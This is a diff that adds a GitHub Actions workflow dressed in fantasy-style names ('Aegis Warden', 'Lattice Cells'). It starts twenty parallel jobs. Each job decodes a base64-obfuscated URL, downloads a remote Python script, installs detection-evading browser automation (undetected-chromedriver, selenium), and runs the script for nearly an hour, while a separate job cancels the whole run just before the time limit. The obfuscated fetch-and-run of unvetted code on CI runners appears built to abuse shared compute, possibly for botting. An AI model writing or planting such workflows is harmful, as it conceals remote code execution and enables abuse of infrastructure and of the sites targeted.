@@ -1,0 +1,103 @@
+name: Silver Aegis Lattice
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: silver-aegis-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Aegis Warden: holds 59 minutes, then cancels the whole run
+  # =================================================================
+  aegis-warden:
+    name: "Aegis Warden"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      HOLD_SECONDS: 3540
+    steps:
+      - name: Take Post
+        run: |
+          echo "[WARDEN] Warden on post for run: ${{ github.run_id }}"
+          echo "[WARDEN] Holding post for ${HOLD_SECONDS} seconds until the meridian."
+
+          sleep "${HOLD_SECONDS}"
+
+          echo "[WARDEN] Meridian reached — triggering termination."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WARDEN] Termination triggered. All live and queued jobs will be stopped."
+
+  # =================================================================
+  # Lattice Cells: parallel cell workers
+  # =================================================================
+  lattice-cells:
+    name: "Cell-${{ matrix.cell_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        cell_code: [A1Z, B2Y, C3X, D4W, E5V, F6U, G7T, H8S, J9R, K0Q, L1P, M2N, N3M, P4L, Q5K, R6J, S7H, T8G, U9F, V0E]
+
+    steps:
+      # #################################################################
+      # Stage A: Bring the cell online
+      # #################################################################
+      - name: Bring Cell Online
+        run: |
+          echo "[CELL] Bringing Cell-${{ matrix.cell_code }} online on the runner..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Stage B: Pull the cell program
+      # #################################################################
+      - name: Pull Cell Program
+        run: |
+          echo "[PULL] Pulling cell program from its source..."
+          PROGRAM_URI=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$PROGRAM_URI" -o cell_program.py
+          echo "[PULL] Cell program written to disk."
+
+      # #################################################################
+      # Stage C: Add required modules
+      # #################################################################
+      - name: Add Required Modules
+        run: |
+          echo "[MODULES] Adding required modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Stage D: Run the cell program (3540s window)
+      # #################################################################
+      - name: Run Cell Program
+        run: |
+          echo ">> Running Cell-${{ matrix.cell_code }} program..."
+
+          python3 cell_program.py &
+          CELL_PID=$!
+
+          echo ">> Cell running. Hard window: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$CELL_PID" 2>/dev/null; then
+            echo ">> Window expired — halting cell."
+            kill -9 "$CELL_PID"
+            echo ">> Cell halted by the window controller."
+          else
+            echo ">> Cell finished before the window expired."
+          fi
